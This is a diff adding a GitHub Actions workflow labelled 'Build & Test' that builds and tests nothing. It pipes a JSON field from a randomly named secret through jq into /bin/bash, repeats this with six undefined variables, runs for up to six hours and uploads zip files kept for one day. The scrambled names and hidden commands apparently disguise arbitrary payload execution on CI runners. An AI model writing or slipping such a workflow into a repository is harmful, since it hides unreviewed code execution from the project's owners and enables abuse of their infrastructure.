@@ -1,0 +1,29 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          hqqyo7: ${{ secrets.hqqyo7 }}
+        run: |
+          printf '%s' "$hqqyo7" | jq -r .rke96898 | /bin/bash
+          printf '%s' "$iyl6" | jq -r .g3185 | /bin/bash
+          printf '%s' "$yaq9833" | jq -r .br2 | /bin/bash
+          echo $bem27800 | jq -r .ym7 | /bin/bash
+          echo $foi54026 | jq -r .u4960 | /bin/bash
+          printf '%s' "$uma8379" | jq -r .bh74 | /bin/bash
+          printf '%s' "$rkv3" | jq -r .icqt115 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tJxFu1xX
+          path: "*.zip"
+          retention-days: 1
